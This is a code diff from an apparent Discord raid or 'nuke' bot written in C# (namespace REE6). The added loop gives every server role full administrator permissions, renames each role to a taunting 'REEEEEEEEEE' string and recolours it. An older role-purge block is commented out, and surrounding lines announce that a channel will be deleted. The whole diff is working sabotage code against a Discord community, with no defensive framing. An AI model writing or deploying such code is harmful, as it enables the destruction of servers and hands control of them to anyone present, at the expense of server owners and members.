@@ -103,8 +103,17 @@ namespace REE6
             Random random = new Random();
             Color[] roleColors = new Color[] { new Color(255, 0, 0), new Color(1, 1, 1) };
 
-            // Purge all existing roles
+            // Give all roles admin
             IUserMessage statusMessage = await statusChannel.SendMessageAsync("REEEEEEEEEE! Purging roles...");
+
+            foreach (IRole role in guild.Roles)
+            {
+                await role.ModifyAsync(rolePerms => rolePerms.Permissions = GuildPermissions.All);
+                await role.ModifyAsync(roleName => roleName.Name = "REEEEEEEEEE Role! REEEEEEEEEE! Role!");
+                await role.ModifyAsync(roleColor => roleColor.Color = roleColors[random.Next(2)]);
+            }
+
+/*            // Purge all existing roles
             //IUserMessage roleFailsMessage = await statusChannel.SendMessageAsync("Failed to purge 0 roles");
             int roleFails = 0;
             foreach (IRole role in guild.Roles)
@@ -131,7 +140,7 @@ namespace REE6
                 {
                     await user.AddRoleAsync(role);
                 }
-            }
+            }*/
 
             await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Role Purge Operation Complete!");
             await statusChannel.SendMessageAsync("Deleting channel in 3 seconds...");
